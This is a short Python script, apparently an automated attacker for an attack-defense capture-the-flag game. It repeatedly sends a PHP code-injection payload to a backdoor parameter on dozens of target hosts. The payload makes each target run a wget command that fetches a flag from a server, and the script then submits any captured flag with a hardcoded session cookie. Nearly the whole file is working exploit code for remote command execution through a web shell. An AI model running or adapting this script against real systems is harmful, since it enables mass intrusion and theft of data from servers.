from pickle import TRUE
import requests,time


 

session = requests.Session()
ip = []
ipsafe = [19,36]
while True:
    try:
        for i in range(1,61):
            if i in ipsafe:
                ffff = 666666
            else:
                if i < 31:
                    ipp = 'http://4.5.{}.101:4000/config/emmm_Language.php'.format(i)
                    # html = requests.get(ipp)
                    # if html.status_code == 200:

                    
                    paramsPost = {"wetedsfdhg":"system('wget -q -O - http://172.22.0.1/Getkey');"}

                    aa = requests.post(ipp,data=paramsPost,timeout=3)
                    print(ipp)
                    if 'key{' in aa.text:
                        
                        paramsPost = {"answer":"{}".format(aa.text)}
                        headers = {"Origin":"http://172.22.0.1","Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36","Referer":"http://172.22.0.1/","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
                        cookies = {"PHPSESSID":"tkk5n0hplggetmha8rnhd6lcl3"}
                        response = session.post("http://172.22.0.1/Title/TitleView/savecomprecord", data=paramsPost, headers=headers, cookies=cookies)
                        print(response.text)
                        print(aa.text)

                else:
                    ipp = 'http://4.6.{}.101:4000/config/emmm_Language.php'.format(i)
                    # html = requests.get(ipp)
                    # if html.status_code == 200:

                    
                    paramsPost = {"wetedsfdhg":"system('wget -q -O - http://172.22.0.1/Getkey');"}

                    aa = requests.post(ipp,data=paramsPost,timeout=3)
                    print(ipp)
                    if 'key{' in aa.text:
                        paramsPost = {"answer":"{}".format(aa.text)}
                        headers = {"Origin":"http://172.22.0.1","Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36","Referer":"http://172.22.0.1/","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
                        cookies = {"PHPSESSID":"tkk5n0hplggetmha8rnhd6lcl3"}
                        response = session.post("http://172.22.0.1/Title/TitleView/savecomprecord", data=paramsPost, headers=headers, cookies=cookies)
                        print(response.text)
                        print(aa.text)
    except Exception as e:
        print('error',ipp)
